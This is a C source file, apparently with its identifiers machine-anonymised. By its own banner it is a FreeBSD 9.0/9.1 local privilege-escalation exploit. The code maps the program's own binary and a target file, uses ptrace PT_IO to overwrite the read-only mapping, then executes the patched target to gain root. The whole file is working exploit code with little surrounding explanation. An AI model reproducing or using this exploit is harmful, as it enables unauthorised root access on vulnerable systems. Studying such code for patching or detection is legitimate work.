
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






struct stat {scalar_t__ st_size; } ;
struct ptrace_io_desc {char* piod_offs; char* piod_addr; scalar_t__ piod_len; int piod_op; } ;
typedef int pid_t ;
typedef int off_t ;
typedef int * caddr_t ;


 char* VAR_0 ;
 int VAR_1 ;
 int VAR_2 ;
 int VAR_3 ;
 int VAR_4 ;
 int VAR_5 ;
 int VAR_6 ;
 int VAR_7 ;
 int VAR_8 ;
 char* VAR_9 ;
 char* VAR_10 ;
 int FUNC_0 (int,char*) ;
 int FUNC_1 (char*,char*,int *) ;
 int FUNC_2 () ;
 scalar_t__ FUNC_3 () ;
 char* FUNC_4 (int *,size_t,int ,int,int,int ) ;
 int FUNC_5 (char*,int ) ;
 int FUNC_6 (char*) ;
 int FUNC_7 (int ,int,int *,int ) ;
 int FUNC_8 (int ) ;
 int FUNC_9 (char*,struct stat*) ;
 int FUNC_10 (int*) ;

int
FUNC_11(int VAR_11, char **VAR_12) {
   int VAR_13, VAR_14, VAR_15;
   struct stat VAR_16;
   struct ptrace_io_desc VAR_17;
   char *VAR_18, *VAR_19;
   pid_t VAR_20;

   if (FUNC_3() == 0) {
        FUNC_8(0);
        FUNC_1(VAR_9, VAR_9, ((void*)0));
        return 0;
   }

   FUNC_6("FreeBSD 9.{0,1} mmap/ptrace exploit\n");
   FUNC_6("by Hunger <fbsd9lul@hunger.hu>\n");

   if ((VAR_13 = FUNC_5(VAR_12[0], VAR_3)) == -1 ||
        (VAR_14 = FUNC_5(VAR_10, VAR_3)) == -1)
                FUNC_0(1, "open");

   if (FUNC_9(VAR_12[0], &VAR_16) == -1)
        FUNC_0(2, "stat");

   if (((VAR_18 = FUNC_4(((void*)0), (size_t)VAR_16.st_size, VAR_5,
        VAR_2, VAR_13, (off_t)0)) == VAR_0) ||
                (VAR_19 = FUNC_4(((void*)0), (size_t)VAR_16.st_size, VAR_5,
                        VAR_2|VAR_1, VAR_14, (off_t)0)) == VAR_0)
                                FUNC_0(3, "mmap");

   if ((VAR_20 = FUNC_2()) == -1)
        FUNC_0(4, "fork");

   if (!VAR_20) {
        if (FUNC_7(VAR_8, VAR_20, ((void*)0), 0) == -1)
                FUNC_0(5, "ptraceme");

        return 0;
        }

   if (FUNC_7(VAR_6, VAR_20, ((void*)0), 0) == -1)
        FUNC_0(6, "ptattach");

   if (FUNC_10(&VAR_15) == -1)
        FUNC_0(7, "wait");

   VAR_17.piod_op = VAR_4;
   VAR_17.piod_offs = VAR_19;
   VAR_17.piod_addr = VAR_18;
   VAR_17.piod_len = VAR_16.st_size;

   if (FUNC_7(VAR_7, VAR_20, (caddr_t)&VAR_17, 0) == -1)
        FUNC_0(8, "ptio");

   FUNC_1(VAR_10, VAR_10, ((void*)0));

   return 0;
}
